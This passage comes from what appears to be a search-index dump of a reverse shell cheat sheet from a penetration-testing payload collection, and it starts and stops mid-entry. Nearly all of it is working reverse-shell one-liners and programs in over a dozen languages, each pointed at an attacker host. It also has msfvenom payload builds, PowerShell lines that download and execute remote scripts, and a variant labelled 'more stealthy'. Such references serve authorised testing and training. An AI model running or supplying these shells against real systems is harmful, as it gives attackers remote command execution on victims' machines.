PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT # client (victim) export RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE Powershell powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') Awk awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null Java Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'\"); p.waitFor(); Java Alternative 1 String host=\"127.0.0.1\"; int port=4444; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Java Alternative 2 NOTE : This is more stealthy Thread thread = new Thread(){ public void run(){ // Reverse shell here } } thread.start(); Telnet In Attacker machine start two listeners: nc -lvp 8080 nc -lvp 8081 In Victime machine run below command: telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081 War msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war strings reverse.war | grep jsp # in order to get the name of the file Lua Linux only lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');\" Windows and Linux lua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' NodeJS (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(4242, \"10.0.0.1\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); or require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242') or -var x = global.process.mainModule.require -x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash') or https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py Groovy by frohoff NOTE: Java reverse shell also work for Groovy String host=\"10.0.0.1\"; int port=4242; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Groovy Alternative 1 NOTE : This is more stealthy Thread.start { // Reverse shell here } C Compile with gcc /tmp/shell.c --output csh && csh #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <stdlib.h> #include <unistd.h> #include <netinet/in.h> #include <arpa/inet.h> int main(void){ int port = 4242; struct sockaddr_in revsockaddr; int sockt = socket(AF_INET, SOCK_STREAM, 0); revsockaddr.sin_family = AF_INET; revsockaddr.sin_port = htons(port); revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\"); connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)); dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2); char * const argv[] = {\"/bin/sh\", NULL}; execve(\"/bin/sh\", argv, NULL); return 0; } Dart import 'dart:io'; import 'dart:convert'; main() { Socket.connect(\"10.0.0.1\", 4242).then((socket) { socket.listen((data) { Process.start('powershell.exe', []).then((Process process) { process.stdin.writeln(new String.fromCharCodes(data).trim()); process.stdout .transform(utf8.decoder) .listen((output) { socket.write(output); }); }); }, onDone: () { socket.destroy(); }); }); } Meterpreter Shell Windows Staged reverse TCP msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe Windows Stageless reverse TCP msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe Linux Staged reverse TCP msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf Linux Stageless reverse TCP msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf Other platforms $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf > shell.elf $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe > shell.exe $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho > shell.macho $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp > shell.asp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.jsp $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war > shell.war $ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.py $ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.sh $ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.pl $ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php Spawn TTY Shell In order to catch a shell, you need to listen on the desired port. rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L] . rlwrap nc 10.0.0.1 4242 rlwrap -r -f . nc 10.0.0.1 4242 -f . will make rlwrap use the current history file as a completion word list. -r Put all words seen on in- and output on the completion list. Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell. :warning: OhMyZSH might break this trick, a simple sh is recommended The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo; fg reset export SHELL=bash export TERM=xterm-256color stty rows <num> columns <cols> or use socat binary to get a fully tty reverse shell socat file:`tty`,raw,echo=0 tcp-listen:12345 Spawn a TTY shell from an interpreter /bin/sh -i python3 -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c \"__import__('pty').spawn('/bin/bash')\" python3 -c \"__import__('subprocess').call(['/bin/bash'])\" perl -e 'exec \"/bin/sh\";' perl: exec \"/bin/sh\"; perl -e 'print `/bin/bash`' ruby: exec \"/bin/sh\" lua: os.execute('/bin/sh') vi: :!bash vi: :set shell=/bin/bash:shell nmap: !sh mysql: ! bash Alternative TTY method www-data@debian:/dev/shm$ su - user su: must be run from a terminal www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null www-data@debian:/dev/shm$ su - user Password: P4ssW0rD user@debian:~$ Fully interactive reverse shell on Windows The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals. ConPtyShell uses the function CreatePseudoConsole() . This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763). Server Side: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Client Side: IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001 Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1 References Reverse Bash Shell One Liner Pentest Monkey - Cheat Sheet Reverse shell Spawning a TTY Shell Obtaining a fully interactive shell","title":"Reverse Shell Cheat Sheet"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#reverse-shell-cheat-sheet","text":"","title":"Reverse Shell Cheat Sheet"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#summary","text":"Tools Reverse Shell Awk Automatic Reverse Shell Generator Bash TCP Bash UDP C Dart Golang Groovy Alternative 1 Groovy Java Alternative 1 Java Alternative 2 Java Lua Ncat Netcat OpenBsd Netcat BusyBox Netcat Traditional NodeJS OpenSSL Perl PHP Powershell Python Ruby Socat Telnet War Meterpreter Shell Windows Staged reverse TCP Windows Stageless reverse TCP Linux Staged reverse TCP Linux Stageless reverse TCP Other platforms Spawn TTY Shell References","title":"Summary"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#tools","text":"reverse-shell-generator - Hosted Reverse Shell generator ( source ) revshellgen - CLI Reverse Shell generator","title":"Tools"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#reverse-shell","text":"","title":"Reverse Shell"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#bash-tcp","text":"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1","title":"Bash TCP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#bash-udp","text":"Victim: sh -i >& /dev/udp/10.0.0.1/4242 0>&1 Listener: nc -u -lvp 4242 Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash","title":"Bash UDP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#socat","text":"user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242 user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 Static socat binary can be found at https://github.com/andrew-d/static-binaries","title":"Socat"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#perl","text":"perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' NOTE: Windows only perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:4242\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","title":"Perl"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#python","text":"Linux only IPv4 export RHOST=\"10.0.0.1\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' IPv4 (No Spaces, Shortened) python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv4 (No Spaces, Shortened Further) python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"10.0.0.1\",4242));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())' IPv6 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces) python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")' IPv6 (No Spaces, Shortened) python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")' Windows only C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"","title":"Python"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#php","text":"php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);`/bin/sh -i <&3 >&3 2>&3`;' php -r '$sock=fsockopen(\"10.0.0.1\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");' php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'","title":"PHP"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4242\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}' NOTE: Windows only ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4242\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'","title":"Ruby"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#golang","text":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go","title":"Golang"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-traditional","text":"nc -e /bin/sh 10.0.0.1 4242 nc -e /bin/bash 10.0.0.1 4242 nc -c bash 10.0.0.1 4242","title":"Netcat Traditional"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-openbsd","text":"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f","title":"Netcat OpenBsd"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#netcat-busybox","text":"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f","title":"Netcat BusyBox"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#ncat","text":"ncat 10.0.0.1 4242 -e /bin/bash ncat --udp 10.0.0.1 4242 -e /bin/bash","title":"Ncat"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#openssl","text":"Attacker: user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242 or user@attack$ ncat --ssl -vv -l -p 4242 user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s TLS-PSK (does not rely on PKI or self-signed certificates) # generate 384-bit PSK # use the generated string as a value for the two PSK variables from below openssl rand -hex 48 # server (attacker) export LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT # client (victim) export RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE","title":"OpenSSL"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#powershell","text":"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')","title":"Powershell"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#awk","text":"awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null","title":"Awk"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java","text":"Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'\"); p.waitFor();","title":"Java"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java-alternative-1","text":"String host=\"127.0.0.1\"; int port=4444; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();","title":"Java Alternative 1"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#java-alternative-2","text":"NOTE : This is more stealthy Thread thread = new Thread(){ public void run(){ // Reverse shell here } } thread.start();","title":"Java Alternative 2"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#telnet","text":"In Attacker machine start two listeners: nc -lvp 8080 nc -lvp 8081 In Victime machine run below command: telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081","title":"Telnet"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#war","text":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war strings reverse.war | grep jsp # in order to get the name of the file","title":"War"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#lua","text":"Linux only lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');\" Windows and Linux lua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'","title":"Lua"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#nodejs","text":"(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(4242, \"10.0.0.1\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); or require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242') or -var x = global.process.mainModule.require -x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash') or https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py","title":"NodeJS"},{"location":"Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/#groovy","text":"by frohoff NOTE: Java reverse shell also work for Groovy String host=\"10.0.0.1\"; int port=4242; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception 